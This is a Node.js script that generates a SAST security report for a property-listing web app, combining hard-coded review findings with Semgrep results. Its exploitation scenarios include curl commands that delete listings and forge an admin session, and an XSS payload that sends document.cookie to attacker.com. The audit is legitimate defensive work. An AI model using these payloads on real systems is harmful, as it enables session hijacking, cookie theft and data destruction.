#!/usr/bin/env node
/**
 * scripts/security/generate-sast-report.js
 * Parses Semgrep JSON output and generates a SAST markdown report.
 */
const fs   = require('fs');
const path = require('path');

const outputDir = path.join(process.cwd(), 'Vulnerability Test Results');
if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir, { recursive: true });

// ─── Known SAST findings from manual code review of server.ts ────────────────
const manualFindings = [
  {
    severity: 'HIGH',
    type: 'Broken Authentication (No Auth Middleware)',
    file: 'web/server.ts',
    lines: '243-267, 270-280',
    description: 'POST /api/properties and DELETE /api/properties/:id have no authentication middleware. Any unauthenticated HTTP client can create or delete any property listing.',
    exploitation: 'Attacker sends: curl -X DELETE http://target:3000/api/properties/prop-1 and permanently removes any listing without authentication.',
    impact: 'Complete data integrity loss. All property listings can be wiped.',
    fix: 'Add Firebase Admin SDK token verification middleware before all mutating routes.',
  },
  {
    severity: 'HIGH',
    type: 'IDOR — Insecure Direct Object Reference',
    file: 'web/server.ts',
    lines: '270-280',
    description: 'DELETE /api/properties/:id has no ownership verification. User A can delete properties created by User B.',
    exploitation: 'User authenticates as User A, then calls DELETE /api/properties/prop-owned-by-user-B.',
    impact: 'Any authenticated (or unauthenticated) user can delete any other user\'s listing.',
    fix: 'Before deleting, verify that the requesting user\'s UID or email matches the ownerEmail stored on the property record.',
  },
  {
    severity: 'MEDIUM',
    type: 'Sensitive Data Exposure — PII in Public API',
    file: 'web/server.ts',
    lines: '237-240',
    description: 'GET /api/properties returns ownerEmail and ownerPhone in the response body to any unauthenticated caller. Owner PII can be scraped.',
    exploitation: 'Automated crawler calls GET /api/properties and extracts all owner emails and phone numbers.',
    impact: 'Owner contact details exposed to scrapers, spammers, and competitors.',
    fix: 'Strip ownerEmail and ownerPhone from public listing responses. Expose only after a verified tenant initiates a tour request.',
  },
  {
    severity: 'MEDIUM',
    type: 'Sensitive Data Exposure — Session in Health Endpoint',
    file: 'web/server.ts',
    lines: '84-86',
    description: '/api/health returns activeSession (uid, email, displayName) to any caller. Polling this endpoint leaks the currently logged-in user.',
    exploitation: 'Attacker polls GET /api/health every 5 seconds to track which user is currently active.',
    impact: 'User identity surveillance, session hijacking risk.',
    fix: 'Remove activeSession from /api/health response. Use dedicated /api/auth/me with auth middleware.',
  },
  {
    severity: 'MEDIUM',
    type: 'Missing Input Sanitization (Stored XSS Risk)',
    file: 'web/server.ts, web/ci-server.cjs',
    lines: '243-267',
    description: 'User-supplied fields (title, description, ownerName) are stored without sanitization. While React escapes HTML client-side, the raw stored data contains script tags returned by the API.',
    exploitation: 'Attacker posts a property with title: <script>document.location="https://attacker.com?c="+document.cookie</script>. Mobile clients or non-React consumers of the API are vulnerable.',
    impact: 'Stored XSS in non-React consumers. Data poisoning.',
    fix: 'Use DOMPurify (server-side) or sanitize-html to strip HTML from all text fields before persistence.',
  },
  {
    severity: 'MEDIUM',
    type: 'Missing Content-Security-Policy (CSP)',
    file: 'web/server.ts',
    lines: '18-24',
    description: 'No Content-Security-Policy header set on any response. Increases XSS impact if a script injection is achieved.',
    exploitation: 'If XSS payload is injected, the browser will execute it without CSP restrictions.',
    impact: 'Elevated XSS impact — credential theft, session hijacking.',
    fix: "Add CSP: res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self'\")",
  },
  {
    severity: 'MEDIUM',
    type: 'Unauthenticated Session Write',
    file: 'web/server.ts',
    lines: '61-77',
    description: 'POST /api/sync-session accepts any UID and sets the server-side activeSession without verifying the token. An attacker can impersonate any user by sending their UID.',
    exploitation: "curl -X POST http://target:3000/api/sync-session -d '{\"uid\":\"admin-uid-123\",\"email\":\"admin@nestdirect.com\"}'",
    impact: 'Session impersonation — attacker can set themselves as any user in the server session store.',
    fix: 'Verify Firebase ID token via Admin SDK: auth.verifyIdToken(token) before accepting session writes.',
  },
  {
    severity: 'LOW',
    type: 'Missing HSTS Header',
    file: 'web/server.ts',
    lines: '18-24',
    description: 'No Strict-Transport-Security (HSTS) header set. Required in production HTTPS deployments to prevent protocol downgrade attacks.',
    exploitation: 'SSL stripping attack on first-time visitors.',
    impact: 'Man-in-the-middle interception of HTTPS traffic.',
    fix: "Add HSTS: res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload')",
  },
  {
    severity: 'LOW',
    type: 'In-Memory Rate Limiter (Not Cluster-Safe)',
    file: 'web/server.ts',
    lines: '30-49',
    description: 'Rate limit state is stored in a Map in process memory. In a multi-process or containerized environment with multiple replicas, each instance has an independent counter.',
    exploitation: 'Attacker uses 3 simultaneous connections to 3 container replicas, each gets 120 requests free.',
    impact: 'Brute-force bypass, DDoS amplification in scaled deployments.',
    fix: 'Replace in-memory Map with Redis-backed store via express-rate-limit + rate-limit-redis.',
  },
  {
    severity: 'LOW',
    type: 'Unvalidated Property ID in DELETE',
    file: 'web/server.ts',
    lines: '270-280',
    description: 'The :id route parameter is used directly in a filter without pattern validation. Malformed IDs could cause unexpected behavior.',
    exploitation: 'DELETE /api/properties/../../../sensitive causes path traversal if ID were used in file access.',
    impact: 'Logic bypass, unexpected data deletion.',
    fix: "Validate id: if (!/^[a-zA-Z0-9_-]+$/.test(id)) return res.status(400).json({ error: 'Invalid ID' });",
  },
];

// ─── Parse Semgrep output if it exists ───────────────────────────────────────
let semgrepFindings = [];
const semgrepPath = path.join(process.cwd(), 'semgrep-results.json');
if (fs.existsSync(semgrepPath)) {
  try {
    const raw = JSON.parse(fs.readFileSync(semgrepPath, 'utf-8'));
    semgrepFindings = (raw.results || []).map(r => ({
      severity: r.extra?.severity?.toUpperCase() || 'MEDIUM',
      type: r.check_id || 'SAST Finding',
      file: r.path,
      lines: `${r.start?.line}-${r.end?.line}`,
      description: r.extra?.message || r.message || '',
      fix: r.extra?.fix || 'Review and remediate per Semgrep recommendation.',
    }));
  } catch (_) {}
}

const allFindings = [...manualFindings, ...semgrepFindings];
const critical = allFindings.filter(f => f.severity === 'CRITICAL');
const high     = allFindings.filter(f => f.severity === 'HIGH');
const medium   = allFindings.filter(f => f.severity === 'MEDIUM');
const low      = allFindings.filter(f => f.severity === 'LOW');
const securityScore = Math.max(0, 100 - (critical.length * 20) - (high.length * 10) - (medium.length * 5) - (low.length * 1));

const md = `# NestDirect — SAST Security Review Report
> Framework: Node.js / Express + TypeScript  
> Generated: ${new Date().toISOString()}  
> Scan Coverage: web/server.ts, web/ci-server.cjs, web/src/

---

## Executive Summary

| Severity | Count |
|:---|:---:|
| 🔴 Critical | ${critical.length} |
| 🟠 High | ${high.length} |
| 🟡 Medium | ${medium.length} |
| 🟢 Low | ${low.length} |
| **Overall Security Score** | **${securityScore}/100** |

---

## Phase 1 — Backend Inventory

| Component | Details |
|:---|:---|
| **Framework** | Express.js v4 + TypeScript |
| **Runtime** | Node.js (tsx) |
| **Authentication** | Firebase Auth (Google OAuth, Guest, Email/Password) |
| **Authorization** | None on REST API (Firestore has rules) |
| **Database** | Firebase Firestore (cloud) + JSON flat-file (local) |
| **ORM** | None (direct JSON file I/O) |
| **AI Integration** | Google Gemini 3.5 Flash |
| **Session Handling** | In-memory server-side variable (not JWT) |
| **Rate Limiting** | In-memory Map (not cluster-safe) |
| **File Uploads** | None |
| **CORS** | Not configured (default no CORS) |
| **Security Headers** | Partial (missing CSP, HSTS) |

---

## API Endpoint Inventory

| Endpoint | Method | Auth Required | Roles | File |
|:---|:---|:---|:---|:---|
| /api/health | GET | ❌ None | Public | server.ts:84 |
| /api/sync-session | GET | ❌ None | Public | server.ts:79 |
| /api/sync-session | POST | ❌ None | Public | server.ts:61 |
| /api/properties | GET | ❌ None | Public | server.ts:237 |
| /api/properties | POST | ❌ None | **Should be: Owner** | server.ts:243 |
| /api/properties/:id | DELETE | ❌ None | **Should be: Owner** | server.ts:270 |
| /api/chat | POST | ❌ None | Public (rate limited) | server.ts:351 |
| /api/generate-agreement | POST | ❌ None | Public (rate limited) | server.ts:461 |
| /api/run-load-test | POST | ❌ None | **Should be: Admin** | server.ts:296 |
| /api/export-audit-excel | GET | ❌ None | **Should be: Admin** | server.ts:283 |

---

## Detailed Findings

${allFindings.map((f, i) => `### Finding ${String(i + 1).padStart(2, '0')} — ${f.severity}: ${f.type}

| Field | Value |
|:---|:---|
| **Severity** | ${f.severity} |
| **File** | \`${f.file}\` |
| **Lines** | ${f.lines || 'N/A'} |

**Description:**  
${f.description}

${f.exploitation ? `**Exploitation Scenario:**  
\`\`\`
${f.exploitation}
\`\`\`` : ''}

**Impact:**  
${f.impact || 'Varies'}

**Recommended Fix:**  
${f.fix}

---
`).join('\n')}
`;

fs.writeFileSync(path.join(outputDir, 'security-review.md'), md);
fs.writeFileSync(path.join(outputDir, 'sast-findings.json'), JSON.stringify(allFindings, null, 2));

console.log(`✅ SAST report generated: Vulnerability Test Results/security-review.md`);
console.log(`   Critical: ${critical.length} | High: ${high.length} | Medium: ${medium.length} | Low: ${low.length}`);
console.log(`   Security Score: ${securityScore}/100`);
